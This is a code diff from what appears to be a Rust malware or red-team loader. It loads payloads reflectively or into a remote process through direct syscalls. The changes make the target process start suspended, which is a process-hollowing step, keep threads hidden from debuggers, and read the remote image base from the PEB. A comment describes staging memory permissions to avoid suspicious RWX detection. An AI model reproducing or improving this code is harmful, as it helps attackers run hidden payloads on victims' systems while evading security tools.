@@ -13,7 +13,7 @@ use std::iter::once;
 use ntapi::ntpsapi::{
     PsCreateInitialState, PPS_ATTRIBUTE_LIST, PROCESSINFOCLASS, PROCESS_BASIC_INFORMATION,
     PS_ATTRIBUTE_IMAGE_NAME, PS_ATTRIBUTE_LIST, PS_CREATE_INFO,
-    THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER,
+    THREAD_CREATE_FLAGS_CREATE_SUSPENDED, THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER,
 };
 use ntapi::ntrtl::{
     RtlAllocateHeap, RtlCreateProcessParametersEx, RtlDestroyProcessParameters, RtlFreeHeap,
@@ -378,18 +378,17 @@ pub fn reflective_loader_syscalls(buf: Vec<u8>) -> Result<(), Box<dyn Error>> {
     Ok(())
 }
 
-fn get_destination_base_addr(prochandle: isize) -> usize {
+fn get_destination_base_addr(prochandle: *mut c_void) -> usize {
     unsafe {
         let mut process_information: PROCESS_BASIC_INFORMATION = std::mem::zeroed();
         let process_information_class = PROCESSINFOCLASS::default();
-        let return_l = 0;
         syscall!(
             "NtQueryInformationProcess",
             prochandle,
             process_information_class,
             &mut process_information as *mut _ as *mut c_void,
             std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32,
-            return_l
+            NULL
         );
         let peb_image_offset = process_information.PebBaseAddress as u64 + 0x10;
         let mut image_base_buffer = [0; std::mem::size_of::<&u8>()];
@@ -479,7 +478,7 @@ pub fn remote_loader_syscalls(buf: Vec<u8>, pe_to_execute: &str) -> Result<(), B
             NULL as *mut OBJECT_ATTRIBUTES,
             NULL as *mut OBJECT_ATTRIBUTES,
             0 as c_ulong,
-            0 as c_ulong,
+            THREAD_CREATE_FLAGS_CREATE_SUSPENDED as c_ulong,
             process_parameters as *mut c_void,
             &mut create_info,
             attribute_list
@@ -492,7 +491,7 @@ pub fn remote_loader_syscalls(buf: Vec<u8>, pe_to_execute: &str) -> Result<(), B
         RtlFreeHeap(RtlProcessHeap(), 0, attribute_list as *mut c_void);
         RtlDestroyProcessParameters(process_parameters);
 
-        let mut remote_base = get_destination_base_addr(prochandle as isize) as *mut c_void;
+        let mut remote_base = get_destination_base_addr(prochandle) as *mut c_void;
 
         //Set the memory access to Read/Write for the moment to avoid suspicious rwx
         let mut base = NULL;
